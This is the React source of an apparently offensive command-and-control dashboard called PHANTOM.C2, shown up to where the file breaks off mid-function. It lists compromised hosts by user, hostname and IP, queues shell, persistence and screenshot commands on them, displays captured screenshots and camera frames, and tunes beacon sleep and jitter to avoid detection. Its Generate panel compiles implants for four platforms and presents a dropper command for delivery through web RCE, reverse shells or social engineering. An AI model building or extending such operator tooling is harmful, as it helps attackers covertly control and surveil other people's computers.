import { useState, useEffect } from 'react'
import { useStore, type Beacon, type C2Task } from '@/store'
import { useApi } from '@/hooks/useApi'
import RemoteCanvas from '@/components/RemoteCanvas'
import {
  Radio, Power, Play, Square, Plus, RefreshCw, Download,
  Terminal, X, ChevronRight, Clock, Globe, Monitor,
  Key, Shield, FileLock, HelpCircle, Zap, Trash2,
  Activity, Timer, HeartPulse, Copy, Check, Camera
} from 'lucide-react'

export default function C2Dashboard() {
  const {
    listener, beacons, activeBeacon, tasks,
    c2Connected, elapsed, setActiveBeacon
  } = useStore()
  const { api, pollC2 } = useApi()
  const [taskInput, setTaskInput] = useState('')
  const [interactView, setInteractView] = useState<'tasks' | 'results' | 'remote'>('tasks')
  const [rightPanel, setRightPanel] = useState<'interact' | 'generate' | 'auth' | 'certs' | 'help'>('interact')
  const [healthText, setHealthText] = useState('')
  const [beaconCmds, setBeaconCmds] = useState<BeaconCommand[]>([])

  // the command catalog powers the task-input autocomplete — load once
  useEffect(() => {
    fetchBeaconCommands(api).then(setBeaconCmds)
  }, [api])
  const [healthLoading, setHealthLoading] = useState(false)

  const handleStartListener = async () => {
    await api('POST', '/api/c2/listener/start')
    pollC2()
  }

  const handleStopListener = async () => {
    await api('POST', '/api/c2/listener/stop')
    pollC2()
  }

  const handleQueueTask = async () => {
    if (!activeBeacon || !taskInput.trim()) return
    await api('POST', `/api/c2/beacon/${activeBeacon}/task`, { command: taskInput })
    setTaskInput('')
    pollC2()
  }

  const handleHealth = async () => {
    if (!activeBeacon) return
    setHealthLoading(true)
    setHealthText('')
    const res = await api('POST', `/api/c2/beacon/${activeBeacon}/task`, { command: 'health' })
    // poll the task result
    if (res.status === 200 && res.data) {
      const { task_id } = res.data as { task_id: string }
      for (let i = 0; i < 15; i++) {
        await new Promise((r) => setTimeout(r, 1200))
        const st = await api('GET', '/api/c2/state')
        if (st.status === 200 && st.data) {
          const t = ((st.data as { tasks: Record<string, C2Task[]> }).tasks[activeBeacon] || [])
            .find((x) => x.task_id === task_id)
          if (t?.result) {
            setHealthText(t.result)
            setHealthLoading(false)
            return
          }
        }
      }
    }
    setHealthLoading(false)
    setHealthText('No health report received (beacon idle or offline).')
  }

  const handleSetSleep = async (ms: string, jitter: string) => {
    if (!activeBeacon) return
    const m = parseInt(ms, 10)
    if (!m || m < 1000) return
    const cmd = jitter ? `set-sleep ${m} ${parseInt(jitter, 10) || 0}` : `set-sleep ${m}`
    await api('POST', `/api/c2/beacon/${activeBeacon}/task`, { command: cmd })
    pollC2()
  }

  const handleKillBeacon = async (id: string) => {
    await api('POST', `/api/c2/beacon/${id}/kill`)
    if (activeBeacon === id) setActiveBeacon(null)
    pollC2()
  }

  const handleInteract = (id: string) => {
    setActiveBeacon(id)
    setRightPanel('interact')
  }

  const activeBeaconData = beacons.find((b) => b.id === activeBeacon)
  const activeBeaconTasks = tasks[activeBeacon || ''] || []

  return (
    <div className="p-4 flex flex-col gap-4 h-full">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-lg font-bold text-text-primary">
            <span className="text-phantom-magenta">PHANTOM</span>
            <span className="text-text-secondary">.C2</span>
          </h1>
          <p className="text-xs text-text-dim mt-0.5">Command & Control Dashboard</p>
        </div>
        <div className="flex items-center gap-2">
          <span className={`w-2 h-2 rounded-full ${c2Connected ? 'bg-phantom-green' : 'bg-phantom-error'}`} />
          <span className="text-xs text-text-secondary">
            {c2Connected ? 'API connected' : 'API disconnected'}
          </span>
        </div>
      </div>

      <div className="flex gap-4 flex-1 min-h-0">
        {/* Left column — Listener + Beacon list */}
        <div className="w-[320px] flex-shrink-0 flex flex-col gap-3">
          {/* Listener card */}
          <div className="bg-surface-card border border-surface-border rounded-lg p-3">
            <div className="flex items-center justify-between mb-2">
              <h2 className="text-xs font-semibold text-text-secondary uppercase tracking-wider flex items-center gap-1.5">
                <Radio size={13} className="text-phantom-magenta" /> Listener
              </h2>
              <button
                onClick={listener.active ? handleStopListener : handleStartListener}
                className={`px-2.5 py-1 rounded text-[10px] font-medium transition-colors
                  ${listener.active
                    ? 'bg-phantom-error/20 text-phantom-error hover:bg-phantom-error/30'
                    : 'bg-phantom-green/20 text-phantom-green hover:bg-phantom-green/30'
                  }`}
              >
                {listener.active ? (
                  <span className="flex items-center gap-1"><Square size={10} /> Stop</span>
                ) : (
                  <span className="flex items-center gap-1"><Play size={10} /> Start</span>
                )}
              </button>
            </div>
            <div className="space-y-1 text-xs">
              <Row label="Protocol" value={`${listener.proto} ${listener.host}:${listener.port}`} active={listener.active} />
              <Row label="Status" value={listener.active ? '● ACTIVE' : '○ STOPPED'} active={listener.active} />
              <Row label="mTLS" value={listener.mtls ? 'ON' : 'OFF'} active={listener.mtls} />
              <Row label="Certs" value={listener.certs_present ? 'present ✓' : '—'} active={listener.certs_present} />
            </div>
          </div>

          {/* Quick actions */}
          <div className="bg-surface-card border border-surface-border rounded-lg p-3">
            <h2 className="text-xs font-semibold text-text-secondary uppercase tracking-wider mb-2">Quick Actions</h2>
            <div className="grid grid-cols-2 gap-1.5">
              <QuickBtn icon={Download} label="Generate" onClick={() => setRightPanel('generate')} />
              <QuickBtn icon={Key} label="Beacon Auth" onClick={() => setRightPanel('auth')} />
              <QuickBtn icon={FileLock} label="Certs" onClick={() => setRightPanel('certs')} />
              <QuickBtn icon={HelpCircle} label="Beacon Help" onClick={() => setRightPanel('help')} />
            </div>
          </div>

          {/* Beacon list */}
          <div className="bg-surface-card border border-surface-border rounded-lg flex-1 flex flex-col min-h-0">
            <div className="px-3 py-2 border-b border-surface-border flex items-center justify-between">
              <h2 className="text-xs font-semibold text-text-secondary uppercase tracking-wider flex items-center gap-1.5">
                <Monitor size={13} className="text-phantom-cyan" /> Beacons
              </h2>
              <button onClick={pollC2} className="text-text-dim hover:text-text-primary transition-colors">
                <RefreshCw size={13} />
              </button>
            </div>
            <div className="overflow-auto flex-1">
              {beacons.length === 0 ? (
                <div className="p-4 text-center text-xs text-text-dim">
                  No beacons connected.<br />
                  <span className="text-text-secondary">Generate a beacon to start.</span>
                </div>
              ) : (
                beacons.map((b) => (
                  <BeaconRow
                    key={b.id}
                    beacon={b}
                    isActive={activeBeacon === b.id}
                    onInteract={() => handleInteract(b.id)}
                    onKill={() => handleKillBeacon(b.id)}
                  />
                ))
              )}
            </div>
          </div>
        </div>

        {/* Right — Dynamic panel */}
        <div className="flex-1 bg-surface-card border border-surface-border rounded-lg flex flex-col min-h-0">
          {rightPanel === 'generate' && <GeneratePanel api={api} pollC2={pollC2} />}
          {rightPanel === 'auth' && <BeaconAuthPanel api={api} />}
          {rightPanel === 'certs' && <CertsPanel api={api} />}
          {rightPanel === 'help' && <BeaconHelpPanel api={api} />}
          {rightPanel === 'interact' && (
            !activeBeacon || !activeBeaconData ? (
              <div className="flex-1 flex flex-col items-center justify-center text-text-dim gap-2">
                <Terminal size={40} className="text-text-dim" />
                <p className="text-sm">Select a beacon to interact</p>
                <p className="text-xs text-text-dim">Click a beacon from the list on the left</p>
              </div>
            ) : (
              <InteractPanel
                beacon={activeBeaconData}
                tasks={activeBeaconTasks}
                taskInput={taskInput}
                commands={beaconCmds}
                api={api}
                setTaskInput={setTaskInput}
                handleQueueTask={handleQueueTask}
                interactView={interactView}
                setInteractView={setInteractView}
                handleHealth={handleHealth}
                handleSetSleep={handleSetSleep}
                healthText={healthText}
                healthLoading={healthLoading}
              />
            )
          )}
        </div>
      </div>
    </div>
  )
}

// ── Sub-components ──────────────────────────────────────────────────────────

function Row({ label, value, active }: { label: string; value: string; active: boolean }) {
  return (
    <div className="flex justify-between">
      <span className="text-text-dim">{label}</span>
      <span className={active ? 'text-phantom-green' : 'text-text-secondary'}>{value}</span>
    </div>
  )
}

function QuickBtn({ icon: Icon, label, onClick }: { icon: typeof Download; label: string; onClick: () => void }) {
  return (
    <button
      onClick={onClick}
      className="flex items-center gap-1.5 px-2.5 py-2 rounded bg-surface border border-surface-border
        text-[10px] text-text-secondary hover:text-text-primary hover:border-surface-border/80 transition-colors"
    >
      <Icon size={12} />
      {label}
    </button>
  )
}

function BeaconRow({
  beacon, isActive, onInteract, onKill
}: {
  beacon: Beacon
  isActive: boolean
  onInteract: () => void
  onKill: () => void
}) {
  return (
    <div
      onClick={onInteract}
      className={`px-3 py-2 border-b border-surface-border cursor-pointer transition-colors
        ${isActive ? 'bg-phantom-magenta/10 border-l-2 border-l-phantom-magenta' : 'hover:bg-surface-hover border-l-2 border-l-transparent'}`}
    >
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <span className={`w-2 h-2 rounded-full ${
            beacon.status === 'LIVE' ? 'bg-phantom-green animate-pulse-beacon' :
            beacon.status === 'IDLE' ? 'bg-phantom-yellow' :
            beacon.status === 'EXITED' ? 'bg-text-dim' : 'bg-phantom-error'
          }`} />
          <span className="text-xs font-mono text-text-primary">{beacon.id.slice(0, 12)}</span>
          {beacon.status === 'EXITED' && (
            <span className="text-[9px] px-1 py-0.5 rounded bg-surface border border-surface-border text-text-dim">exited</span>
          )}
          {beacon.tasks_pending > 0 && beacon.status === 'LIVE' && (
            <span className="text-[9px] px-1 py-0.5 rounded bg-phantom-yellow/15 text-phantom-yellow">{beacon.tasks_pending} queued</span>
          )}
        </div>
        <div className="flex items-center gap-1">
          <span className="text-[10px] text-text-dim">{beacon.last_seen_display}</span>
          <button
            onClick={(e) => { e.stopPropagation(); onKill() }}
            className="text-text-dim hover:text-phantom-error transition-colors p-0.5"
            title="Kill beacon"
          >
            <X size={12} />
          </button>
          <ChevronRight size={12} className="text-text-dim" />
        </div>
      </div>
      <div className="flex items-center gap-2 mt-0.5 text-[10px] text-text-dim">
        <span>{beacon.user}@{beacon.hostname}</span>
        <span>·</span>
        <span>{beacon.os}</span>
        <span>·</span>
        <span>{beacon.source_ip}</span>
      </div>
    </div>
  )
}

/** One task row: newest first, click to expand the FULL result. */
function TaskRow({ task, index }: { task: C2Task; index: number }) {
  const [open, setOpen] = useState(false)
  const hasResult = !!task.result
  return (
    <>
      <tr onClick={() => hasResult && setOpen((v) => !v)}
        className={`border-b border-surface-border/50 hover:bg-surface-hover/50 ${hasResult ? 'cursor-pointer' : ''}`}>
        <td className="py-1.5 px-2 text-text-dim">{index}</td>
        <td className="py-1.5 px-2 font-mono text-text-primary">{task.command}</td>
        <td className="py-1.5 px-2 text-center">
          <span className={`text-[10px] px-1.5 py-0.5 rounded font-medium
            ${task.status === 'done' ? 'bg-phantom-green/20 text-phantom-green' :
              task.status === 'sent' ? 'bg-phantom-yellow/20 text-phantom-yellow' :
              'bg-surface-border text-text-dim'}`}>
            {task.status === 'done' ? '✓ done' : task.status === 'sent' ? '⏳ sent' : '○ pending'}
          </span>
        </td>
        <td className="py-1.5 px-2 text-text-dim font-mono max-w-[300px] truncate">
          {task.result ? (task.result.split('\n')[0] || '') : '—'}
          {hasResult && (
            <span className="ml-1 text-[9px] text-phantom-cyan">{open ? '▲ hide' : '▼ full'}</span>
          )}
        </td>
      </tr>
      {open && hasResult && (
        <tr className="border-b border-surface-border/50 bg-surface">
          <td colSpan={4} className="px-4 py-2">
            <pre className="text-[11px] font-mono text-text-primary whitespace-pre-wrap max-h-72 overflow-auto">
              {task.result}
            </pre>
          </td>
        </tr>
      )}
    </>
  )
}

function InteractPanel({
  beacon, tasks, taskInput, setTaskInput, handleQueueTask,
  interactView, setInteractView,
  handleHealth, handleSetSleep, healthText, healthLoading,
  commands, api
}: {
  beacon: Beacon
  tasks: C2Task[]
  taskInput: string
  setTaskInput: (v: string) => void
  handleQueueTask: () => void
  interactView: 'tasks' | 'results' | 'remote'
  setInteractView: (v: 'tasks' | 'results' | 'remote') => void
  handleHealth: () => void
  handleSetSleep: (ms: string, jitter: string) => void
  healthText: string
  healthLoading: boolean
  commands: BeaconCommand[]
  api: ReturnType<typeof useApi>['api']
}) {
  // autocomplete: suggest commands matching the current word while typing
  const [suggests, setSuggests] = useState<BeaconCommand[]>([])
  const [showSuggests, setShowSuggests] = useState(false)
  const onTaskInput = (v: string) => {
    setTaskInput(v)
    const word = v.trim().toLowerCase()
    if (!word) { setSuggests([]); return }
    const matches = commands.filter((c) =>
      c.command.toLowerCase().startsWith(word)
      || c.command.toLowerCase().split(' ')[0].startsWith(word)).slice(0, 6)
    setSuggests(matches)
    setShowSuggests(matches.length > 0)
  }
  const acceptSuggest = (c: BeaconCommand) => {
    setTaskInput(c.command)
    setShowSuggests(false)
  }
  return (
    <>
      <div className="px-3 py-2 border-b border-surface-border flex items-center justify-between">
        <div className="flex items-center gap-2">
          <span className={`w-2 h-2 rounded-full ${
            beacon.status === 'LIVE' ? 'bg-phantom-green animate-pulse-beacon' :
            beacon.status === 'IDLE' ? 'bg-phantom-yellow' :
            beacon.status === 'EXITED' ? 'bg-text-dim' : 'bg-phantom-error'
          }`} />
          <span className="text-sm font-mono text-phantom-cyan">{beacon.id.slice(0, 16)}</span>
          {beacon.status === 'EXITED' && (
            <span className="text-[9px] px-1 py-0.5 rounded bg-surface border border-surface-border text-text-dim">exited</span>
          )}
          <span className="text-xs text-text-dim">{beacon.user}@{beacon.hostname}</span>
        </div>
        <div className="flex items-center gap-2 text-xs text-text-secondary">
          <Clock size={12} /><span>{beacon.last_seen_display}</span>
          <span className="text-text-dim">|</span>
          <Globe size={12} /><span>{beacon.os}</span>
        </div>
      </div>

      <div className="flex border-b border-surface-border">
        {(['tasks', 'results', 'remote'] as const).map((t) => (
          <button key={t} onClick={() => setInteractView(t as 'tasks' | 'results' | 'remote')}
            className={`px-3 py-1.5 text-xs font-medium border-b-2 transition-colors
              ${interactView === t ? 'border-phantom-magenta text-phantom-magenta' : 'border-transparent text-text-secondary hover:text-text-primary'}`}>
            {t === 'tasks' ? 'Tasks' : t === 'results' ? 'Results' : 'Remote'}
          </button>
        ))}
      </div>

      {/* Beacon Health card */}
      <div className="px-3 py-2 border-b border-surface-border bg-surface/50">
        <div className="flex items-center justify-between gap-2">
          <span className="text-[10px] font-semibold text-text-dim uppercase tracking-wider flex items-center gap-1.5">
            <HeartPulse size={12} className="text-phantom-green" /> Health & Cadence
          </span>
          <div className="flex items-center gap-2">
            <button onClick={handleHealth} disabled={healthLoading}
              className="px-2 py-1 rounded bg-phantom-green/15 text-phantom-green text-[10px]
                hover:bg-phantom-green/25 transition-colors flex items-center gap-1
                disabled:opacity-50">
              {healthLoading ? <RefreshCw size={10} className="animate-spin" /> : <Activity size={10} />}
              health
            </button>
            <SleepControl onApply={handleSetSleep} />
          </div>
        </div>
        {healthText && (
          <pre className="mt-1.5 text-[10px] font-mono text-text-secondary whitespace-pre-wrap bg-surface rounded p-2 border border-surface-border">
            {healthText}
          </pre>
        )}
      </div>

      {interactView === 'tasks' && (
        <>
          {/* Live media strip: screenshots / camera frames / recordings the
              beacon delivered — shown INLINE above the task list so the
              operator sees the image, not just a saved path. */}
          <MediaStrip api={api} beaconId={beacon.id} />
          <div className="flex-1 overflow-auto p-2">
            {tasks.length === 0 ? (
              <div className="text-xs text-text-dim p-4 text-center">No tasks queued. Type a command below.</div>
            ) : (
              <table className="w-full text-xs">
                <thead><tr className="text-text-dim border-b border-surface-border">
                  <th className="text-left py-1.5 px-2 w-8">#</th>
                  <th className="text-left py-1.5 px-2">Command</th>
                  <th className="text-center py-1.5 px-2 w-16">Status</th>
                  <th className="text-left py-1.5 px-2">Result</th>
                </tr></thead>
                <tbody>
                  {[...tasks].reverse().map((task, ri) => (
                    <TaskRow key={task.task_id} task={task} index={tasks.length - ri} />
                  ))}
                </tbody>
              </table>
            )}
          </div>
          <div className="p-2 border-t border-surface-border relative">
            {showSuggests && suggests.length > 0 && (
              <div className="absolute bottom-full left-2 right-2 mb-1 bg-surface border border-surface-border rounded shadow-lg z-10 overflow-hidden">
                {suggests.map((c) => (
                  <button key={c.command} onClick={() => acceptSuggest(c)}
                    className="w-full text-left px-3 py-1.5 hover:bg-surface-hover flex items-center gap-2">
                    <span className="font-mono text-[11px] text-phantom-cyan">{c.command}</span>
                    <span className="text-[10px] text-text-dim truncate">{c.description}</span>
                  </button>
                ))}
                <div className="px-3 py-1 text-[9px] text-text-dim border-t border-surface-border">↑ continue typing or click a suggestion</div>
              </div>
            )}
            <div className="flex gap-2">
              <input
                type="text" value={taskInput}
                onChange={(e) => onTaskInput(e.target.value)}
                onBlur={() => setTimeout(() => setShowSuggests(false), 150)}
                onKeyDown={(e) => {
                  if (e.key === 'Enter') { setShowSuggests(false); handleQueueTask() }
                  if (e.key === 'Escape') setShowSuggests(false)
                }}
                placeholder="task beacon (shell whoami, screenshot, persist, ...)"
                className="flex-1 bg-surface border border-surface-border rounded px-3 py-1.5 text-xs font-mono text-text-primary placeholder-text-dim focus:outline-none focus:border-phantom-magenta"
              />
              <button onClick={handleQueueTask}
                className="px-3 py-1.5 rounded bg-phantom-magenta/20 text-phantom-magenta text-xs font-medium hover:bg-phantom-magenta/30 flex items-center gap-1">
                <Plus size={12} /> Queue
              </button>
            </div>
          </div>
        </>
      )}

      {interactView === 'results' && <ResultsView beaconId={beacon.id} api={api} tasks={tasks} />}
      {interactView === 'remote' && <RemoteCanvas beacon={beacon} api={api} />}
    </>
  )
}

// ── Media strip: live thumbnails of delivered artifacts ────────────────────
// Shown directly above the task table (and reused by the Results view) so
// screenshots / camera frames / recordings are visible immediately after
// the beacon checks in — never just a saved path in a text result.

function MediaStrip({ api, beaconId, compact }: {
  api: ReturnType<typeof useApi>['api']; beaconId: string; compact?: boolean
}) {
  const [items, setItems] = useState<Artifact[]>([])
  const [thumbs, setThumbs] = useState<Record<string, string>>({})
  const [viewing, setViewing] = useState<{ name: string; dir: string; media: string; data: string } | null>(null)

  const load = async () => {
    const res = await api('GET', '/api/c2/artifacts')
    if (res.status !== 200) return
    const images = (((res.data as { artifacts?: Artifact[] }).artifacts) || [])
      .filter((a) => a.kind === 'image')
      .slice(0, compact ? 4 : 9)
    setItems(images)
  }

  useEffect(() => { load() }, [beaconId])

  // refresh when new results land (poll every 4s while the beacon is active)
  useEffect(() => {
    const h = setInterval(load, 4000)
    return () => clearInterval(h)
  }, [beaconId])

  // fetch thumbnails for the newest few
  useEffect(() => {
    for (const a of items) {
      const key = `${a.dir}/${a.name}`
      if (thumbs[key]) continue
      api('GET', `/api/c2/artifact?dir=${a.dir}&name=${encodeURIComponent(a.name)}`)
        .then((res) => {
          if (res.status === 200) {
            const d = res.data as { media: string; data: string }
            setThumbs((t) => ({ ...t, [key]: `data:${d.media};base64,${d.data}` }))
          }
        })
    }
  }, [items])

  if (items.length === 0) return null

  return (
    <>
      <div className="px-2 pt-2">
        <p className="text-[9px] uppercase tracking-wider text-text-dim mb-1 flex items-center gap-1">
          <Camera size={10} /> Captured media ({items.length}) — click to view
        </p>
        <div className={`grid gap-1.5 ${compact ? 'grid-cols-4' : 'grid-cols-3'}`}>
          {items.map((a) => (
            <button key={a.name} onClick={() => openArtifact(a)}
              className="rounded border border-surface-border overflow-hidden hover:border-phantom-cyan/60 transition-colors bg-surface">
              <img src={thumbs[`${a.dir}/${a.name}`] || ''}
                className={`${compact ? 'h-14' : 'h-16'} w-full object-cover`} alt={a.name} />
              <div className="px-1 py-0.5 text-[8px] text-text-dim truncate">{a.name}</div>
            </button>
          ))}
        </div>
      </div>

      {viewing && (
        <div className="fixed inset-0 z-50 bg-black/80 flex items-center justify-center p-8"
          onClick={() => setViewing(null)}>
          <div className="max-w-[90vw] max-h-[90vh] flex flex-col gap-2" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between">
              <span className="text-xs font-mono text-text-primary">{viewing.name}</span>
              <button onClick={() => setViewing(null)} className="text-text-dim hover:text-text-primary"><X size={16} /></button>
            </div>
            <img src={`data:${viewing.media};base64,${viewing.data}`}
              className="max-w-[90vw] max-h-[80vh] object-contain rounded border border-surface-border" alt={viewing.name} />
          </div>
        </div>
      )}
    </>
  )

  async function openArtifact(a: Artifact) {
    const res = await api('GET', `/api/c2/artifact?dir=${a.dir}&name=${encodeURIComponent(a.name)}`)
    if (res.status === 200) setViewing(res.data as { name: string; dir: string; media: string; data: string })
  }
}

// ── Results view: text results + real image rendering for artifacts ────────

interface Artifact { name: string; kind: string; dir: string; size: number; mtime: string }

function ResultsView({ beaconId, api, tasks }: {
  beaconId: string; api: ReturnType<typeof useApi>['api']; tasks: C2Task[]
}) {
  const textResults = tasks.filter((t) => t.status === 'done' && t.result)

  return (
    <div className="flex-1 overflow-auto p-3">
      <div className="text-xs text-text-secondary space-y-2">
        <MediaStrip api={api} beaconId={beaconId} />
        {textResults.length === 0 && (
          <p className="text-text-dim">Results appear here when the beacon checks in and delivers task output.</p>
        )}
        {textResults.map((t) => (
          <div key={t.task_id} className="bg-surface rounded p-2 border border-surface-border">
            <div className="flex items-center gap-2 mb-1">
              <span className="text-[10px] text-text-dim">{t.task_id}</span>
              <span className="text-[10px] font-mono text-phantom-cyan">{t.command}</span>
            </div>
            <pre className="text-[11px] font-mono text-text-primary whitespace-pre-wrap">{t.result}</pre>
          </div>
        ))}
      </div>
    </div>
  )
}

// ── Sleep cadence mini-control ─────────────────────────────────────────────

function SleepControl({ onApply }: { onApply: (ms: string, jitter: string) => void }) {
  const [open, setOpen] = useState(false)
  const [ms, setMs] = useState('')
  const [jitter, setJitter] = useState('')

  if (!open) {
    return (
      <button onClick={() => setOpen(true)}
        className="px-2 py-1 rounded bg-phantom-cyan/15 text-phantom-cyan text-[10px]
          hover:bg-phantom-cyan/25 transition-colors flex items-center gap-1">
        <Timer size={10} /> set-sleep
      </button>
    )
  }
  return (
    <div className="flex items-center gap-1">
      <input value={ms} onChange={(e) => setMs(e.target.value)} placeholder="ms"
        className="w-14 bg-surface border border-surface-border rounded px-1.5 py-1
          text-[10px] font-mono text-text-primary focus:outline-none focus:border-phantom-cyan" />
      <input value={jitter} onChange={(e) => setJitter(e.target.value)} placeholder="%"
        className="w-10 bg-surface border border-surface-border rounded px-1.5 py-1
          text-[10px] font-mono text-text-primary focus:outline-none focus:border-phantom-cyan" />
      <button onClick={() => { onApply(ms, jitter); setOpen(false) }}
        className="px-2 py-1 rounded bg-phantom-cyan/25 text-phantom-cyan text-[10px] hover:bg-phantom-cyan/35">
        apply
      </button>
      <button onClick={() => setOpen(false)}
        className="px-1.5 py-1 text-text-dim hover:text-text-primary text-[10px]">✕</button>
    </div>
  )
}

// ── Generate Beacon Panel ──────────────────────────────────────────────────

function GeneratePanel({ api, pollC2 }: { api: ReturnType<typeof useApi>['api']; pollC2: () => void }) {
  const [platform, setPlatform] = useState('windows')
  const [generating, setGenerating] = useState(false)
  const [result, setResult] = useState<{ path?: string; size?: number; dropper?: string; c2?: string; error?: string } | null>(null)
  const [copied, setCopied] = useState(false)

  const handleGenerate = async () => {
    setGenerating(true)
    setResult(null)
    const res = await api('POST', '/api/c2/generate', { platform })
    setGenerating(false)
    setResult(res.data as { path?: string; size?: number; error?: string })
    pollC2()
  }

  const platforms = [
    { id: 'windows', label: 'Windows (x64)', icon: '🪟' },
    { id: 'linux', label: 'Linux (x64)', icon: '🐧' },
    { id: 'android', label: 'Android (ARM64)', icon: '📱' },
    { id: 'macos', label: 'macOS', icon: '🍎' },
  ]

  return (
    <div className="flex-1 flex flex-col p-4 gap-4">
      <div className="flex items-center gap-2">
        <Download size={17} className="text-phantom-cyan" />
        <h2 className="text-sm font-bold text-text-primary">Generate Beacon</h2>
      </div>
      <p className="text-xs text-text-dim -mt-2">Compile a cross-platform C2 beacon with AES-256-GCM encryption + sleep/jitter OPSEC.</p>

      <div className="grid grid-cols-2 gap-2">
        {platforms.map((p) => (
          <button key={p.id} onClick={() => setPlatform(p.id)}
            className={`flex items-center gap-2 px-3 py-2.5 rounded text-xs font-medium transition-colors
              ${platform === p.id ? 'bg-phantom-cyan/20 text-phantom-cyan border border-phantom-cyan/50' : 'bg-surface text-text-secondary hover:bg-surface-hover border border-surface-border'}`}>
            <span>{p.icon}</span> {p.label}
          </button>
        ))}
      </div>

      <button onClick={handleGenerate} disabled={generating}
        className={`w-full py-2.5 rounded text-xs font-semibold uppercase tracking-wider transition-colors flex items-center justify-center gap-2
          ${generating ? 'bg-surface-border text-text-dim cursor-not-allowed' : 'bg-phantom-cyan/20 text-phantom-cyan hover:bg-phantom-cyan/30'}`}>
        {generating ? <span className="animate-pulse">Compiling...</span> : <><Download size={13} /> Compile {platform.charAt(0).toUpperCase() + platform.slice(1)} Beacon</>}
      </button>

      {result && !result.error && (
        <div className="bg-phantom-green/10 border border-phantom-green/30 rounded p-3 text-xs">
          <p className="text-phantom-green font-medium">✓ Beacon compiled</p>
          <p className="text-text-secondary mt-1">Binary: <span className="font-mono text-text-primary">{result.path}</span></p>
          <p className="text-text-dim">Size: {result.size ? `${(result.size / 1024).toFixed(1)} KB` : 'unknown'} · C2: <span className="font-mono">{result.c2 || '—'}</span></p>
          {result.dropper && (
            <div className="mt-2">
              <p className="text-text-dim text-[10px] uppercase tracking-wider mb-1">Deploy command — run on the target (RCE / reverse shell / hand-off)</p>
              <div className="flex items-start gap-1.5">
                <code className="flex-1 bg-surface border border-surface-border rounded p-2 font-mono text-[10px] text-phantom-yellow break-all whitespace-pre-wrap select-all">{result.dropper}</code>
                <button onClick={() => {
                  navigator.clipboard?.writeText(result.dropper!)
                  setCopied(true)
                  setTimeout(() => setCopied(false), 1500)
                }}
                  className="px-2 py-1 rounded bg-phantom-cyan/20 text-phantom-cyan text-[10px] hover:bg-phantom-cyan/30 flex-shrink-0 flex items-center gap-1">
                  {copied ? <Check size={11} className="text-phantom-green" /> : <Copy size={11} />} {copied ? 'Copied' : 'Copy'}
                </button>
              </div>
              <p className="text-[9px] text-text-dim mt-1">Paste this into any code-execution channel (web RCE, reverse shell, scheduled task, social-engineering delivery) — it downloads and injects the beacon.</p>
            </div>
          )}
        </div>
      )}
      {result?.error && (
        <div className="bg-phantom-error/10 border border-phantom-error/30 rounded p-3 text-xs text-phantom-error">
          ✗ {result.error}
          <p className="text-text-dim mt-1">Ensure the build toolchain is installed (g++/mingw-w64/ndk).</p>
        </div>
      )}
    </div>
  )
}

// ── Beacon Auth Panel ──────────────────────────────────────────────────────

function BeaconAuthPanel({ api }: { api: ReturnType<typeof useApi>['api'] }) {
  const [identities, setIdentities] = useState<Array<{ id: string; key_hash?: string; created?: string }>>([])
  const [loading, setLoading] = useState(false)
  const [msg, setMsg] = useState('')

  const load = async () => {
    const res = await api('GET', '/api/c2/beacon-auth')
    if (res.status === 200) setIdentities((res.data as { identities: [] }).identities || [])
  }

  const handleRotate = async (beaconId: string) => {
    setLoading(true)
    setMsg('')
    const res = await api('POST', '/api/c2/beacon-auth/rotate', { beacon_id: beaconId })
    setLoading(false)
    if (res.status === 200) { setMsg('Key rotated ✓'); load() }
    else setMsg('Rotation failed')
  }

  const handleRevoke = async (beaconId: string) => {
    setLoading(true)
    setMsg('')
    const res = await api('POST', '/api/c2/beacon-auth/revoke', { beacon_id: beaconId })
    setLoading(false)
    if (res.status === 200) { setMsg('Identity revoked ✓'); load() }
    else setMsg('Revocation failed')
  }

  return (
    <div className="flex-1 flex flex-col p-4 gap-4">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <Key size={17} className="text-phantom-yellow" />
          <h2 className="text-sm font-bold text-text-primary">Beacon Authentication</h2>
        </div>
        <button onClick={load} className="text-text-dim hover:text-text-primary"><RefreshCw size={13} /></button>
      </div>
      <p className="text-xs text-text-dim -mt-2">Per-beacon HMAC identity keys — only authenticated beacons can communicate with the C2.</p>

      {msg && (
        <div className={`text-xs px-3 py-2 rounded ${msg.includes('✓') ? 'bg-phantom-green/10 text-phantom-green border border-phantom-green/30' : 'bg-phantom-error/10 text-phantom-error border border-phantom-error/30'}`}>
          {msg}
        </div>
      )}

      {identities.length === 0 ? (
        <div className="text-xs text-text-dim p-4 text-center">No beacon identities registered yet. Auto-generated on first beacon check-in.</div>
      ) : (
        <div className="space-y-2">
          {identities.map((ident: { id: string; key_hash?: string; created?: string }) => (
            <div key={ident.id} className="bg-surface border border-surface-border rounded p-3 flex items-center justify-between">
              <div>
                <span className="text-xs font-mono text-text-primary">{ident.id}</span>
                <div className="text-[10px] text-text-dim mt-0.5">
                  Hash: {ident.key_hash?.slice(0, 16) || '—'}... · Created: {ident.created || '—'}
                </div>
              </div>
              <div className="flex gap-1.5">
                <button onClick={() => handleRotate(ident.id)} disabled={loading}
                  className="px-2 py-1 rounded text-[10px] bg-phantom-yellow/20 text-phantom-yellow hover:bg-phantom-yellow/30 transition-colors">
                  <RefreshCw size={10} className="inline mr-1" /> Rotate
                </button>
                <button onClick={() => handleRevoke(ident.id)} disabled={loading}
                  className="px-2 py-1 rounded text-[10px] bg-phantom-error/20 text-phantom-error hover:bg-phantom-error/30 transition-colors">
                  <Trash2 size={10} className="inline mr-1" /> Revoke
                </button>
              </div>
            </div>
          ))}
        </div>
      )}

      <button onClick={() => handleRotate('')} disabled={loading}
        className="w-full py-2 rounded text-xs font-semibold bg-phantom-yellow/20 text-phantom-yellow hover:bg-phantom-yellow/30 transition-colors flex items-center justify-center gap-2">
        <Zap size={12} /> Rotate All Keys
      </button>
    </div>
  )
}

// ── Certs Panel ─────────────────────────────────────────────────────────────

function CertsPanel({ api }: { api: ReturnType<typeof useApi>['api'] }) {
  const [certs, setCerts] = useState<{ present: boolean; dir: string; files: Array<{ name: string; size: number }> } | null>(null)
  const [msg, setMsg] = useState('')

  const load = async () => {
    const res = await api('GET', '/api/c2/certs')
    if (res.status === 200) setCerts(res.data as { present: boolean; dir: string; files: Array<{ name: string; size: number }> })
  }

  const handleUninstall = async () => {
    const res = await api('POST', '/api/c2/certs/uninstall')
    if (res.status === 200) { setMsg('Certificates removed ✓') }
